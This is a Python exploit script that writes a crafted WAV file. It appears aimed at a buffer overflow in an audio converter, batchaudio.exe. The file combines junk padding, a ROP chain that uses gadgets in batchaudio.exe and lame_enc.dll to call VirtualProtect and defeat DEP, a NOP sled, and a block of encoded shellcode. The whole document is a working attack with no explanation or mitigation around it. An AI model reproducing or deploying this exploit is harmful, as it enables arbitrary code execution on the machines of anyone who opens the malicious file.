#!/usr/bin/python

import struct
file = 'batchau-rop.wav'

junk = 'A' * 4136

rop = '\x52\x70\x4d\x00'			# ADD ESP,3EC # POP EBX # RETN    ** [batchaudio.exe]
rop+= 'A' * 24
rop+= struct.pack('<L', 0x004d0002)	# POP EBX # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x77e71210)	# ptr to &VirtualProtect() (skipped module criteria) check if pointer is reliable !) [IAT RPCRT4.dll]
rop+= struct.pack('<L', 0x004051f3)	# MOV EDX,DWORD PTR DS:[EBX] # POP EBX # MOV EAX)EDX # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x00531cf8) # PUSH EAX # POP EBX # RETN    ** [batchaudio.exe]		EBX now hold VirtualProtect
rop+= struct.pack('<L', 0x0041e80b) # PUSH EBX # POP ESI # POP EBX # RETN    ** [batchaudio.exe]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate) 
rop+= struct.pack('<L', 0x00434001)	# POP EBP # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x00597fe7)	# & jmp esp [batchaudio.exe]
rop+= struct.pack('<L', 0x004d0002)	# POP EBX # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x00000201)	# 0x00000201-> ebx
rop+= struct.pack('<L', 0x1001f6ae)	# POP EDX # RETN [lame_enc.dll] 
rop+= struct.pack('<L', 0x00000040)	# 0x00000040-> edx
rop+= struct.pack('<L', 0x1002b208)	# POP ECX # RETN [lame_enc.dll] 
rop+= struct.pack('<L', 0x10001000)	# &Writable location [lame_enc.dll]
rop+= struct.pack('<L', 0x00403f81)	# POP EDI # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x10007803)	# RETN (ROP NOP) [lame_enc.dll]
rop+= struct.pack('<L', 0x00529002)	# POP EAX # RETN [batchaudio.exe] 
rop+= struct.pack('<L', 0x90909090)	# nop
rop+= struct.pack('<L', 0x100023c6)	# PUSHAD # RETN [lame_enc.dll]

nop = '\x90' * 32
shellcode = ("\x89\xe7\xdb\xcd\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x58\x68\x4e\x69\x47\x70\x43\x30\x45\x50\x43\x50\x4e"
"\x69\x49\x75\x56\x51\x4b\x62\x52\x44\x4c\x4b\x52\x72\x50\x30"
"\x4e\x6b\x43\x62\x56\x6c\x4c\x4b\x56\x32\x54\x54\x4e\x6b\x54"
"\x32\x56\x48\x54\x4f\x4d\x67\x51\x5a\x54\x66\x54\x71\x49\x6f"
"\x50\x31\x49\x50\x4e\x4c\x45\x6c\x51\x71\x51\x6c\x54\x42\x56"
"\x4c\x51\x30\x4f\x31\x5a\x6f\x56\x6d\x47\x71\x5a\x67\x58\x62"
"\x58\x70\x52\x72\x52\x77\x4e\x6b\x50\x52\x56\x70\x4e\x6b\x51"
"\x52\x47\x4c\x43\x31\x4e\x30\x4c\x4b\x47\x30\x52\x58\x4d\x55"
"\x4b\x70\x50\x74\x43\x7a\x56\x61\x5a\x70\x56\x30\x4c\x4b\x47"
"\x38\x56\x78\x4c\x4b\x52\x78\x47\x50\x56\x61\x49\x43\x5a\x43"
"\x47\x4c\x51\x59\x4e\x6b\x50\x34\x4e\x6b\x43\x31\x4b\x66\x45"
"\x61\x49\x6f\x54\x71\x4f\x30\x4c\x6c\x4b\x71\x58\x4f\x56\x6d"
"\x45\x51\x4b\x77\x45\x68\x4d\x30\x52\x55\x5a\x54\x47\x73\x43"
"\x4d\x5a\x58\x45\x6b\x43\x4d\x47\x54\x50\x75\x5a\x42\x43\x68"
"\x4c\x4b\x43\x68\x47\x54\x45\x51\x58\x53\x51\x76\x4e\x6b\x54"
"\x4c\x50\x4b\x4c\x4b\x51\x48\x47\x6c\x43\x31\x58\x53\x4c\x4b"
"\x47\x74\x4e\x6b\x56\x61\x5a\x70\x4d\x59\x51\x54\x54\x64\x45"
"\x74\x51\x4b\x43\x6b\x51\x71\x51\x49\x50\x5a\x43\x61\x49\x6f"
"\x49\x70\x51\x48\x51\x4f\x50\x5a\x4c\x4b\x56\x72\x5a\x4b\x4c"
"\x46\x51\x4d\x51\x7a\x43\x31\x4c\x4d\x4e\x65\x4c\x79\x45\x50"
"\x45\x50\x43\x30\x56\x30\x45\x38\x50\x31\x4c\x4b\x52\x4f\x4e"
"\x67\x49\x6f\x58\x55\x4d\x6b\x58\x70\x58\x35\x4c\x62\x50\x56"
"\x45\x38\x4f\x56\x4f\x65\x4f\x4d\x4d\x4d\x49\x6f\x4e\x35\x45"
"\x6c\x56\x66\x43\x4c\x54\x4a\x4d\x50\x49\x6b\x49\x70\x51\x65"
"\x56\x65\x4d\x6b\x47\x37\x45\x43\x50\x72\x52\x4f\x43\x5a\x45"
"\x50\x52\x73\x4b\x4f\x58\x55\x52\x43\x50\x61\x52\x4c\x45\x33"
"\x43\x30\x41\x41")

sisa = 'C' * 500

payload = junk+rop+nop+shellcode+sisa

f = open(file,'w')
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()
